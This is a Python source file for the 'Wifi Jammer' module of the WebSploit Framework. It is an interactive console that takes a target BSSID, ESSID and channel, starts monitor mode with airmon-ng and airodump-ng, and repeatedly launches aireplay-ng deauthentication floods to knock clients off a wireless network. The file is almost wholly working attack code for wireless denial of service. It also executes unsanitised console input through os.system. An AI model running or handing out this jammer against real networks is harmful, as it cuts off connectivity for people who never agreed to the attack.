#!/usr/bin/env python
#
# WebSploit Framework Wifi Jammer module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com
import os
import subprocess
from core import wcolors
from core import help
from time import sleep

options = ["wlan0", "", "", "mon0", "11"]

def wifi_jammer():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Wifi_Jammer" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] == 'set interface':
            options[0] = com[14:20]
            print "INTERFACE => ", options[0]
            wifi_jammer()
        elif com[0:9] == 'set bssid':
            options[1] = com[10:]
            print "BSSID => ", options[1]
            wifi_jammer()
        elif com[0:9] =='set essid':
            options[2] = com[10:]
            print "ESSID => ", options[2]
            wifi_jammer()
        elif com[0:7] =='set mon':
            options[3] = com[8:12]
            print "MON => ", options[3]
            wifi_jammer()
        elif com[0:11] =='set channel':
            options[4] = com[12:14]
            print "CHANNEL => ", options[4]
            wifi_jammer()
        elif com[0:2] =='os':
            os.system(com[3:])
            wifi_jammer()
        elif com[0:4] =='help':
            help.help()
            wifi_jammer()
        elif com[0:4] =='back':
            pass
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "interface\t"+options[0]+"\t\t\t\tyes\tWireless Interface Name"
            print "bssid\t\t"+options[1]+"\t\t\t\tyes\tTarget BSSID Address"
            print "essid\t\t"+options[2]+"\t\t\t\tyes\tTarget ESSID Name"
            print "mon\t\t"+options[3]+"\t\t\t\tyes\tMonitor Mod(default)"
            print "channel\t\t"+options[4]+"\t\t\t\tyes\tTarget Channel Number"
            print ""
            wifi_jammer()
        elif com[0:4] =='scan':
            xterm_1 = "airmon-ng start " + options[0]
            xterm_2 = "xterm -e airodump-ng " + options[3] + " &"
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            sleep(3)
            os.system(xterm_2)
            wifi_jammer()
        elif com[0:3] =='run':
            print (wcolors.color.GREEN + "[*]Attack Has Been Started on : " + options[2] + wcolors.color.ENDC)
            xterm_3 = "xterm -e airodump-ng -c " + options[4] + " --bssid " + options[1] + " " + options[3] + " &"
            os.system(xterm_3)
            sleep(4)
            xterm_4 = "xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a " + options[1] + " -e " + options[2] + " " + options[3] + " &"
            os.system(xterm_4)
            sleep(1)
            os.system(xterm_4)
            wifi_jammer()
        elif com[0:4] =='stop':
            subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            wifi_jammer()
        else:
            print "Wrong Command => ", com
            wifi_jammer()
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)